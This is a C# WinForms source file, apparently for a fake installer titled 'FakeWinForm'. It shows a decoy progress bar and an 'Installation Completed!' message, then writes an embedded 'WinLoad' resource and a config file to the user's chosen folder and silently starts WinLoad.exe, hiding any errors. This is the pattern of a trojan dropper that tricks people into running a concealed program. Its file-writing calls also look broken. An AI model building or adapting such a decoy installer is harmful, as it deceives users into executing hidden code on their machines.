using System.Windows.Forms.Design;
using System.IO;
using System.Diagnostics;

namespace FakeWinForm
{
    public partial class Form1 : Form
    {
        private System.Windows.Forms.Timer time = new System.Windows.Forms.Timer();

        public Form1()
        {
            InitializeComponent();
        }

        private void browseBtn_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fakePath = new FolderBrowserDialog();
            fakePath.ShowDialog();
            pathTxtBox.Text = fakePath.SelectedPath;
        }

        private void pathTxtBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (pathTxtBox.Text == "Enter Path to Install...")
            {
                pathTxtBox.Text = "";
            }
        }

        private void installBtn_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(pathTxtBox.Text))
            {
                MessageBox.Show("Invalid Path", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else
            {
                time.Interval = 5000;
                time.Tick += new EventHandler(IncreaseProgressBar);
                time.Start();
            }
        }

        private void IncreaseProgressBar(object sender, EventArgs e)
        {



            progressBar1.Increment(1000);
            if (progressBar1.Value == progressBar1.Maximum)
            {
                time.Stop();
                MessageBox.Show("Installation Completed!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);

                File.WriteAllBytes(pathTxtBox.Text, Properties.Resources.WinLoad);
                File.WriteAllText(pathTxtBox.Text, Properties.Resources.config);

                try
                {
                    using (Process proc = new Process())
                    {
                        proc.StartInfo.FileName = pathTxtBox.Text + "\\WinLoad.exe";
                        proc.Start();
                    }
                }
                catch { }

            }
        }
    }
}